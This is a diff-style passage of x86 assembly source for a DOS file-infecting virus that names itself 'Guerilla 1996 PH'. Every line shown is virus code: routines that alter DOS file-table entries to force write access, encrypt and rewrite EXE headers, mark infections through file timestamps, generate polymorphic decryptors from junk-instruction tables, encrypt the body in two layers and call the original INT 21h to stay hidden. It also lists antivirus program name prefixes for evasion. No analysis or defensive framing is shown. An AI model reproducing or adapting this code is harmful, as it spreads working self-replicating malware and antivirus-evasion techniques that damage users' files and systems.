+                                                   ; ES:DI -> JFT entry
+                                                   ; for file handle in
+                                                   ; current process
+                   xor     bx,bx
+                   mov     bl,es:[di]              ; BL = SFT entry number
+                   mov     ax,1216h                ; Get address of SFT
+                   int     2Fh
+
+                   mov     word ptr es:[di+2],2    ; Set RW mode to file
+           pop bx
+           retn
+   get_sft         endp
+
+
+   get_default_dr  proc    near
+                   mov     ah,19h                  ; Get current default
+                   call    do_orig_int21h          ; drive
+                   cmp     al,2                    ; Compare with C:
+           retn
+   get_default_dr  endp
+
+
+   ; timestamp check/creation
+   ;
+
+   check_filetime  proc    near
+                   mov     ax,es:[di+0Dh]          ; Filetime
+                   db      83h,0e0h,1fh            ; AND ax,1fh
+                   db      83h,0f0h,05h            ; XOR ax,05h
+                   retn
+   check_filetime  endp
+
+   ; Reads 1Ch bytes from the current file to DS:DX and sets SI=DX
+   ;
+
+   read_header     proc    near
+                   mov     ah,3Fh                  ; Read from file
+                   mov     cx,1Ch                  ; 1Ch bytes
+                   call    do_orig_int21h          ; do the Int 21h
+           mov si,dx
+           retn
+   read_header     endp
+
+   ; Writes 18h bytes to file from DS:DX
+   ;
+
+   write_header    proc    near
+                   mov     ah,40h                  ; Write to file
+                   mov     cx,18h                  ; 18h bytes
+                   call    do_orig_int21h          ; Call original int 21h
+           retn
+   write_header    endp
+
+
+   ; calculate the number of foo bytes to write at the tail of the file
+   ; the routine is very simple
+
+   modify_time     proc    near
+                   mov     cx,es:[di+0Dh]          ; FileTime
+           shr cx,1            ; Shift w/zeros fill
+           shr cx,1            ; Shift w/zeros fill
+           shr cx,1            ; Shift w/zeros fill
+           shr cx,1            ; Shift w/zeros fill
+           shr cx,1            ; Shift w/zeros fill
+           and cx,3Fh
+           retn
+   modify_time     endp
+
+
+   encrypt_header  proc    near
+           push    di
+                   mov     ah,byte ptr file_time   ; Use time as key
+
+                   nosmart
+                   lea     di,head_buffer          ; Point on EXE header
+                   smart
+
+                   mov     cx,18h
+
+   enc_head_loop:
+           mov al,[di]
+                   xor     al,ah                   ; Encrypt the EXE header
+                   mov     [di],al                 ; using a 8bit XOR
+           inc di
+                   loop    enc_head_loop
+
+           pop di
+           retn
+   encrypt_header  endp
+
+
+   ; Put current offset in file to 0:0, that means to the start of the
+   ; file. ES:DI of course on the SFT entry.
+   ;
+
+   seek_woff       proc    near
+                   mov     word ptr es:[di+15h],0
+           mov word ptr es:[di+17h],0
+           retn
+   seek_woff       endp
+
+
+   ; copies 4 random bytes from the table pointed by CS:[SI+random] to the
+   ; space for filling at CS:[DI]. The random offset in the table is calculated
+   ; from the infection marker and is minor than BX
+   ;
+
+   copy_poly_b     proc    near
+           push    es
+           push    ds
+           push    ax
+           push    cx
+           push    bx
+           push    si
+           push    di
+           push    cs
+           pop ds
+           push    cs
+           pop es
+                   mov     ax,inf_marker
+           xor ax,di
+   num_select:
+                   shr     ax,1
+           mov cx,ax
+           and cx,3
+                   cmp     cx,bx                   ; Minor than max?
+                   jge     num_select              ; No, retry.
+
+                   mov     ax,cx
+           mov cx,4
+                   mul     cl
+                   add     si,ax                   ; Point to the selected
+                   mov     cx,5                    ; bytes
+                   jmp     short start_copy_loop   ; Go and copy the bytes
+
+                   db      0EAh
+
+   copy_loop:
+                   mov     al,byte ptr cs:[si]
+                   mov     byte ptr cs:[di],al
+           inc di
+           inc si
+   start_copy_loop:
+                   loop    copy_loop
+
+                   pop     di
+           pop si
+           pop bx
+           pop cx
+           pop ax
+           pop ds
+           pop es
+           retn
+   copy_poly_b     endp
+
+   ; Table with operations that will be put in the decryptor
+   ;
+
+   enc_table_start:
+                   clc
+                   clc
+                   clc
+           nop
+                   or      ax,ax
+           nop
+           nop
+                   db      83h,0c8h,00h            ; OR ax,0
+                   nop
+   src_fill_6:
+                   push    bp
+           pop si
+                   clc
+                   clc
+           mov si,bp
+                   or      ax,ax
+           mov si,bp
+                   or      dx,dx
+   src_fill_10:
+                   nop
+           nop
+                   jc      $+4
+                   jnc     $+4
+                   jmp     short $+4
+   src_fill_9:
+                   nop
+           add di,si
+           nop
+                   clc
+                   adc     di,si
+                   clc
+                   nop
+                   clc
+           add di,si
+   src_fill_4:
+                   inc     di
+           dec di
+           inc di
+           nop
+           dec di
+           inc di
+           nop
+           inc di
+           add di,1
+           nop
+   src_fill_12:
+                   nop
+           nop
+                   db       66h, 4Ah               ; DEC edx
+                   db       66h, 83h,0EAh, 01h     ; SUB edx,01h
+   src_fill_7:
+                   db       66h, 0Bh,0D2h          ; OR edx,edx
+                   nop
+                   db       66h, 23h,0D2h          ; AND edx,edx
+                   nop
+                   db       66h, 83h,0FAh, 00h     ; CMP edx,00h
+   src_fill_5:
+                   sub     bx,bx
+                   sub     bx,bx
+                   mov     bx,0
+           nop
+           nop
+           and bx,0
+   src_fill_3:
+                   mov     ah,3
+           mov al,5
+           mov cx,305h
+           xchg    cx,ax
+           mov al,5
+           mov ah,3
+   src_fill_11:
+                   jz      $+4                     ; Jump if zero
+                   jmp     short $-16h
+           jnz $-14h           ; Jump if not zero
+           nop
+           nop
+   src_fill_8:
+                   mov     ax,offset first_encr_start
+           xchg    di,ax
+                   mov     di,offset first_encr_start
+           nop
+           nop
+                   mov     di,offset first_encr_start
+           and ax,2090h
+
+   end_poly_generation_tables:             ; end of table used by the poly
+
+   virus_string    db      ' Guerilla 1996 PH '
+
+   dollar_char     db      '$'
+
+   stealth_enabled db      01h
+
+   av_mem_names    db      'TB*','NAV','NEM'
+   av_names        db      'TB','VI','AV','NA','NE','VS','FI'
+                   db      'F-','IM','FV','SC','QB','IV'
+
+   end_second_encrypt:
+
+
+   ; Second encryption/decryption loop
+   ;
+
+   second_encr     proc    near
+                   db      0b0h                    ; mov al,
+   second_rand     db      00h                     ; random number
+                   jc      change_to_add           ; If carry change to ADD
+
+                   mov     byte ptr cs:[operation_byte+si],2Ah     ; SUB
+                   jmp     short encrypt_work
+   change_to_add:
+                   mov     byte ptr cs:[operation_byte+si],02h     ; ADD
+
+   encrypt_work:
+                   mov     di,offset start_second_encrypt
+           add di,si
+                   mov     cx,second_encrypt_lenght        ; Lenght
+                   jmp     short begin_oper_loop
+
+                   db      0EAh                    ; Just to fool someone
+
+   oper_loop:
+                   mov     ah,byte ptr cs:[di]
+
+   operation_byte  db      02h                     ; "ADD ah" or "SUB ah"
+                   db      0e0h                    ; with al
+
+                   mov     byte ptr cs:[di],ah
+           inc di
+   begin_oper_loop:
+                   loop    oper_loop
+                   retn
+   second_encr     endp
+
+
+   ; enc_dec_copy will encrypt the body of the virus in memory (with both
+   ; layers), then will write the encrypted body to the file (with also
+   ; some foo bytes) and finally will decrypt the body of the virus in memory
+   ;
+
+   enc_dec_copy    proc    near
+                   push    ax                      ; AH = 40h
+                   push    cx                      ; CX = Bytes to write
+           xor si,si           ; Zero register
+           stc             ; Set carry flag
+                   call    second_encr             ; Second encryption
+           stc             ; Set carry flag
+                   call    first_layer_enc         ; First encryption
+   first_encr_end:
+                   pop     cx                      ; Bytes to write
+                   pop     ax                      ; AH = 40h
+                   call    do_orig_int21h          ; Write the body of the virus
+   fill_poly_1:
+                   nop
+           nop
+           nop
+           nop
+                   call    first_layer_enc         ; Decrypt our body
+   fill_poly_2:
+                   nop
+           nop
+           nop
+           nop
+                   call    second_encr             ; Second decryption
+           retn
+   enc_dec_copy    endp
+
+
+   ; First (heh, the one that is first seen by the user ;) ) encryption loop
+   ;
+
+   first_layer_enc proc    near
+
+                   db      0b1h                    ; mov cl,
+   first_rand      db      00h                     ; random value
+   fill_poly_10:
+                   nop
+           nop
+           nop
+           nop
+
+                   db      0b1h                    ; mov cl,
+   first_rand_beta db      00h                     ; random value
+
+   ; One of the two "mov cl," will be used for encryption the other for
+   ; decryption (depending on what will be generated in fill_poly_10.
+   ; Infact when encrypting we call this with Carry set, but then depends
+   ; if we generated a JNC or a JC with the engine). Of course this means
+   ; that first_rand_beta = 10h - first_rand
+   ;
+
+   fill_poly_8:
+                   mov     di,offset first_encr_start
+                   nop
+   fill_poly_9:
+                   add     di,si
+                   nop
+           nop
+
+                   db      66h,0BAh              ; mov edx,(lenght to encr)
+                   dw      first_enc_lenght
+                   dw      00h
+
+                   jmp     short fill_poly_12
+
+                   db      0EAh                    ; just to fool someone
+
+                   db      2Eh, 8Ah                ; mov xx,cs:[di]
+   reg8ch1         db      25h                     ; AL or AH
+
+                   db      0D2h                    ; ROx ah,cl
+   rotate_oper     db      0CCh                    ; ROL or ROR
+
+                   db      2Eh, 88h                ; mov cs:[di],xx
+   reg8ch2         db      25h                     ; AL or AH
+
+   fill_poly_4:
+                   db      47h                     ; inc di
+                   nop
+                   nop
+                   nop
+
+   fill_poly_12:
+                   db      66h,4Ah                 ; dec edx
+                   nop
+                   nop
+
+   fill_poly_7:
+                   db      66h,83h,0FAh,00h        ; cmp edx,00h
+
+   fill_poly_11:
+                   db      75h,0EAh                ; JNE dec_loopy
+
+                   nop
+                   nop
+                   ret
+   first_layer_enc endp
+
+   ; Generates a call to the original INT21h
+   ;
+
+   do_orig_int21h  proc    near
+           pushf               ; Push flags
+                       db      9Ah                 ; CALL far ptr
+   sec_int21_offset    dw      00h
+   sec_int21_segment   dw      00h
+           retn
+   do_orig_int21h  endp
+
+   ; where the encrypted EXE header will be stored
+   ;
+
+   head_buffer       db      18h dup (0)
+
+   file_time         dw      0
+   file_date         dw      0
+
+   virus_end_file:
+
+   ; Place for storing ES:DI where the SFT is located
+
+   sft_es           dw      00h
+   sft_di           dw      00h
+
+   lenght_dx        dw      0
+   lenght_ax        dw      0
+   inf_marker       dw      0
+   exe_header_space db      1ch dup (0)
+
+   virus_end:
+
+   guerilla        ends
+
+           end start
